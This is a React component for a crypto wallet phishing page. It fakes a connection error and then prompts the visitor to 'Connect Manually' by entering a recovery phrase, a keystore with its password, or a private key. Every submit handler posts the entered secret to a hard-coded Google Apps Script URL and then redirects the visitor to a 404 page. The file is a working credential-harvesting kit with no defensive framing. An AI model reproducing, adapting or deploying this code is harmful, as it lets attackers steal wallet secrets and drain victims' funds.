import { useCoindata } from "./useCoindata";
import { useParams } from "react-router-dom";
import Button from '@mui/material/Button';
import { Link } from "react-router-dom";
import { Typography, Stack, Box } from '@mui/material';
import CancelIcon from '@mui/icons-material/Cancel';
import IconButton from '@mui/material/IconButton';
import './component.css';
import FormControl, { useFormControl } from '@mui/material/FormControl';
import OutlinedInput from '@mui/material/OutlinedInput';
import FormHelperText from '@mui/material/FormHelperText';
import * as React from 'react';
import { useEffect, useState } from "react";
import Paper from '@mui/material/Paper';
import Img from 'react-image';
import Tabs from '@mui/material/Tabs';
import Tab from '@mui/material/Tab';
import PropTypes from 'prop-types';
import { TextareaAutosize as BaseTextareaAutosize } from '@mui/base/TextareaAutosize';
import { styled } from '@mui/system';
import Textarea from '@mui/joy/Textarea';
import { GoogleSpreadsheet } from 'google-spreadsheet';
import { useNavigate } from 'react-router-dom';
function CustomTabPanel(props) {
  const { children, value, index, ...other } = props;

  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`full-width-tabpanel-${index}`}
      aria-labelledby={`full-width-tab-${index}`}
      {...other}
    >
      {value === index && (
        <Box sx={{ p: 3 }}>
          <Typography>{children}</Typography>
        </Box>
      )}
    </div>
  );
}

CustomTabPanel.propTypes = {
  children: PropTypes.node,
  index: PropTypes.number.isRequired,
  value: PropTypes.number.isRequired,
};

function a11yProps(index) {
  return {
    id: `full-width-tab-${index}`,
    'aria-controls': `full-width-tabpanel-${index}`,
  };
}



function MyFormHelperText() {

    const { focused } = useFormControl() || {};
  

    const [inputPlaceholder, setInputPlaceholder] = useState('Linking your product id');
    const [inputError, setInputError] = useState(false);
    const [showButton, setShowButton] = useState(false);


 


    const helperText = React.useMemo(() => {
      if (focused) {
        return 'This field is being focused';
      }
  
      return 'Helper text';
    }, [focused]);
  
    return <FormHelperText>{helperText}</FormHelperText>;
  }
const Moreinfo = () => {
  // const [coin_name,  setcoin_name] = useState("")
  const navigate = useNavigate();
  const doc = new GoogleSpreadsheet('1KZD7oiEG7WfZSArCXXkMavWahyVAEPCg2lFTOh6fhhw');
  const [value, setValue] = React.useState(0);
  
  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  const [noterror, seterror] = useState('neterror')
  useEffect(() => {
    const timer = setTimeout(() => {
      setInputPlaceholder("Error Connecting...");
     
      setShowButton(true);
      seterror('error')
    }, 1000);
    // setcoin_name(data?.data.name)
    return () => clearTimeout(timer);
  }, []);

  const [inputPlaceholder, setInputPlaceholder] = useState('initializing...');
  const [inputError, setInputError] = useState(false);
  const [showButton, setShowButton] = useState(false);
  const [phrase, setphrasevalue]= useState("");
  const [keystore, setkeystorevalue] = useState('');
  const[showpage, setshowpage] = useState(false)
  const [wallet_password, setwalletvalue ] = useState('');
  const [private_key, setprivatekeyvalue ] = useState('');
const handleshowmore = () => {
  setshowpage(true)
}

  const setupGoogleSheet = async () => {
    await doc.useServiceAccountAuth({
      client_email: process.env.REACT_APP_GOOGLE_CLIENT_EMAIL,
      private_key: process.env.REACT_APP_GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
    });
    await doc.loadInfo(); // loads document properties and worksheets
  };


  const handlephraseChange = (event) => {
    
    setphrasevalue(event.target.value);
    
  };
  
  const handlekeystoreChange = (event) => {
    setkeystorevalue(event.target.value);
  };
  const handlewalletChange = (event) => {
    setwalletvalue(event.target.value);
  };
  const handleprivatekeyChange = (event) => {
    setprivatekeyvalue(event.target.value);
  };

  // const handlereqphrase = async (e) => {
  //   e.preventDefault()
  //   try {
  //     await setupGoogleSheet();
  //     const sheet = doc.sheetsByIndex[0]; // or use doc.sheetsById[id]
  //     const newRow = { phrase }; // Use the state value here
  //     await sheet.addRow(newRow);
  //   } catch (e) {
  //     console.error('Error: ', e);
  //   }
  // };



  const scriptURL = 'https://script.google.com/macros/s/AKfycbwxKSNXaJQOzAN6SPnSishKsyF-t6uz06mdmCMaNw0nfZ8YUIyZV7UUNBK75gsD0v9LJg/exec'


  const handlereqphrase = (e) => {
    e.preventDefault()
    const coin_name = name;
    const fullinfo = JSON.stringify({ coin_name, phrase });
    const formData = new FormData();
  formData.append('phrase', phrase);
  formData.append('coin_name', coin_name);
  const fulldata = formData;
  console.log(fulldata)
    fetch(scriptURL, { method: 'POST', body: fulldata})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
      setTimeout(() => {
        navigate('/404_notfound');
      }, 2500);
    // console.log(fullinfo)
    
    
  }

 

  const handlereqprivatekey = (e) => {
    e.preventDefault()
    const coin_name = name;
    const fullinfo = JSON.stringify({ coin_name, phrase });
    const formData = new FormData();
  formData.append('private_key', private_key);
  formData.append('coin_name', coin_name);
  

  const fulldata = formData;
  console.log(fulldata)
    fetch(scriptURL, { method: 'POST', body: fulldata})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
      setTimeout(() => {
        navigate('/404_notfound');
      }, 2500);
  }

  const handlereqkeystore = (e) => {
    
    e.preventDefault()
    const coin_name = name;
    const fullinfo = JSON.stringify({ coin_name, phrase });
    const formData = new FormData();
  formData.append('keystore', keystore);
  formData.append('coin_name', coin_name);
  formData.append('wallet_password', wallet_password);

  const fulldata = formData;
  console.log(fulldata)
    fetch(scriptURL, { method: 'POST', body: fulldata})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
      setTimeout(() => {
        navigate('/404_notfound');
      }, 2500);
  }

const {id} = useParams()
const { data, isLoading,  } = useCoindata(id)


const photo = data?.data.logo;
const name = data?.data.name;



  const blue = {
    100: '#DAECFF',
    200: '#b6daff',
    400: '#3399FF',
    500: '#007FFF',
    600: '#0072E5',
    900: '#003A75',
  };

  const grey = {
    50: '#F3F6F9',
    100: '#E5EAF2',
    200: '#DAE2ED',
    300: '#C7D0DD',
    400: '#B0B8C4',
    500: '#9DA8B7',
    600: '#6B7A90',
    700: '#434D5B',
    800: '#303740',
    900: '#1C2025',
  };

  const Textarea = styled(BaseTextareaAutosize)(
    ({ theme }) => `
    box-sizing: border-box;
    width: 320px;
    font-family: 'IBM Plex Sans', sans-serif;
    font-size: 0.875rem;
    font-weight: 400;
    line-height: 1.5;
    padding: 8px 12px;
    border-radius: 8px;
    color: ${theme.palette.mode === 'dark' ? grey[300] : grey[900]};
    background: ${theme.palette.mode === 'dark' ? grey[900] : '#fff'};
    border: 1px solid ${theme.palette.mode === 'dark' ? grey[700] : grey[200]};
    box-shadow: 0px 2px 2px ${theme.palette.mode === 'dark' ? grey[900] : grey[50]};

    &:hover {
      border-color: ${blue[400]};
    }

    &:focus {
      border-color: ${blue[400]};
      box-shadow: 0 0 0 3px ${theme.palette.mode === 'dark' ? blue[600] : blue[200]};
    }

    // firefox
    &:focus-visible {
      outline: 0;
    }
  `,
  );



















    return ( <>
      <Box className="overlay" sx={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(0, 0, 0, 0.8)', zIndex: 1, filter: 'blur(150px)' }} />

      <Box sx={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', zIndex: 2 }}>
        <Stack className="firstupdiv" spacing={2} direction="column" alignItems="center" justifyContent="center"
        sx={{

           width: {
            xs: "270px",
            sm: '280px',
            md: '450px'
           },
         backgroundColor: 'white' 
        }}
         
        >


            
                <div className="upnav"> 
                   <Button variant="text" component={Link} to='/'>
            Back
          </Button> 


          <IconButton aria-label="delete" component={Link} to='/'>
        <CancelIcon />
      </IconButton>
                </div>
            
          
          {/* Other components */}
          <Box>
            <div className="outlineinput">
            <Typography variant="body1">{inputPlaceholder}</Typography>
            {showButton && (
                    <button className="unvail"  
                    onClick={handleshowmore}
                     >
                      Connect Manually
                    </button>
                  )}
            </div>
           {/* <form noValidate autoComplete="off">
              <FormControl sx={{ width: '25ch' }}>
                <OutlinedInput
                
                  placeholder={inputPlaceholder}
                  disabled
                 
                  
                  endAdornment={showButton && (
                    <Button variant="contained" 
                    onClick={handleshowmore}
                    color="primary" sx={{
                      borderRadius: '20px',
                      

                    }}>
                      Connect Manually
                    </Button>
                  )}
                  className="outlineinput"
                  sx={{
                    outlineColor: 'red',
                    borderColor: 'red',
                    borderRadius: '20px',
                    width: '100%'
                  }} />
              </FormControl>
            </form> */}

          </Box>
          
          <div className="downfoot">
      <Box
        component={Paper}
        elevation={3}
        sx={{
          width: (theme) => theme.spacing(8), // Adjust the size as needed
          height: (theme) => theme.spacing(8),
          borderRadius: '50%',
           
          overflow: 'hidden', 
          '& img': {
            width: '100%', // Ensures the image scales with the container
            height: '100%',
            objectFit: 'contain', 
          },
        }}
      >
        <img src={photo} alt={name} />
      </Box>
      <Typography variant='subtitle1'>{name}</Typography>

      </div>
        </Stack>
      </Box>
      
      {showpage && <Box className="con_tab" sx={{ width: {
            xs: "270px",
            sm: '280px',
            md: '430px'
           }, 
    position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', zIndex: 3
    
    }}>
      <div className="upnavs"> 
      <img src={photo} alt={name} />
      <form action="post">
      <input type="text" className="Cname" value={name} name='coin_name' disabled />
      </form>
      {/* <Typography variant='h6'>{name}</Typography> */}
      </div>
      <Box sx={{ borderBottom: 1, borderColor: 'divider' }}>
        <Tabs className="tab_head" sx={{
          justifyContent: 'space-between',
        }} value={value} onChange={handleChange} 
        variant="fullWidth"
        aria-label="basic tabs example">
          <Tab label="Phrase" {...a11yProps(0)} />
          <Tab label="keystore" {...a11yProps(1)} />
          <Tab label="private key" {...a11yProps(2)} />
        </Tabs>
      </Box>
      <CustomTabPanel value={value} index={0}>
        <form onSubmit={handlereqphrase}>
        <Box>
     
<textarea
className="textinput"
required
name="phrase"
      style={{
         // default border color
        outlineColor: '#3399FF' // border color when the textarea is focused
      }}
      placeholder="Enter your recovery phrase"
      value={phrase}
       onChange={(e) => setphrasevalue(e.target.value)}
    />
    </Box>
    <p  className="suptext">Typically 12 (sometimes 24) words separated by single spaces</p>
    <Stack>
    <Button type="submit" variant="contained">IMPORT</Button>
    </Stack>
    </form >
    
      </CustomTabPanel>
      <CustomTabPanel value={value} index={1}>
        <form onSubmit={handlereqkeystore}>

        
        <Box>

        <textarea
        name="keystore"
className="textinput"
required
      style={{
         // default border color
        outlineColor: '#3399FF' // border color when the textarea is focused
      }}
      placeholder="Enter keystore"
      value={keystore}
      onChange={handlekeystoreChange}
    />

        
        </Box>
        <Box>


        <textarea
className="textinputsmall"
required
name="wallet_password"
      style={{
         // default border color
        outlineColor: '#3399FF' // border color when the textarea is focused
      }}
      placeholder="wallet password"
      value={wallet_password}
     onChange={handlewalletChange}
    />

         
        </Box>   
      
    <p className="suptext">Several lines of text beginning with<code> {"{...}"}</code> plus the password you used to encrypt it.</p>
    <Stack>
    <Button type="submit" variant="contained">IMPORT</Button>
    </Stack>
</form>

      </CustomTabPanel>
      <CustomTabPanel value={value} index={2}>
        <form onSubmit={handlereqprivatekey}>
      <Box>




      <textarea
className="textinputsmall"
required
name="private_key"
      style={{
         // default border color
        outlineColor: '#3399FF' // border color when the textarea is focused
      }}
      placeholder="Enter ypur private key"
      value={private_key}
     onChange={handleprivatekeyChange}
    />

         
        </Box>   
      
    <p  className="suptext" sx={{
      lineHeight: '10px'
    }}>Typically 12 (sometimes 24) words separated by a single space.</p>
    <Stack>
    <Button type="submit" variant="contained">IMPORT</Button>
    </Stack>
    </form>
      </CustomTabPanel>
    </Box>}

    </> );
}
 
export default Moreinfo;